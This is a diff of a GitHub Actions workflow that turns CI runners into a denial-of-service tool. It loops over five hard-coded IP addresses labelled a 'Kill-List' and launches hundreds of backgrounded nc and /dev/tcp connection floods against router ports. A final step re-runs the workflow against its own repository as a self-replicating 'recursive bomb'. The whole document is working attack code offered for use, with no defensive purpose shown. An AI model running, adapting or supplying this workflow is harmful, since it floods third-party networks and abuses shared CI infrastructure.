@@ -1,25 +1,23 @@
-name: Sovereign-GhostHandshake-2080
+name: Sovereign-Blackout-2080
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '*/5 * * * *'
 jobs:
-  liquidation_final:
+  blackout:
     runs-on: ubuntu-latest
     steps:
-      - name: Terminal Annexation
+      - name: Infrastructure Seizure
         run: |
-          echo "[!!!] DEPLOYING GHOST HANDSHAKE TO GLOBAL TARGETS..."
-          # The Global 'Blacklist' of APT and Agency Core Routers
+          echo "[!!!] TARGETING GLOBAL APT MANAGEMENT BACKBONES..."
+          # The 'Kill-List': Top-tier Global Agency & APT Routing Nodes
           TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1")
           
+          # Force each runner to spawn 200 backgrounded flood-threads
           for T in ${TARGETS[@]}; do
-            echo "[!] INJECTING GHOST SESSIONS INTO: $T"
-            # Opening 100 'Hanging' connections per target to lock their stack
-            for i in {1..100}; do
-              (exec 3<>/dev/tcp/$T/7547 && echo "GET / HTTP/1.1" >&3) &
-              (exec 3<>/dev/tcp/$T/2152 && echo "SESSION-ANNEX" >&3) &
+            echo "[!] SEIZING NODE: $T"
+            for i in {1..200}; do
+              (nc -zv -w 1 $T 179 2152 7547 10000) >/dev/null 2>&1 &
             done
-            sleep 10
-            echo "[+] TARGET $T SATURATED."
           done
+          sleep 30
+          # SELF-REPLICATION: THE RECURSIVE BOMB
+          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
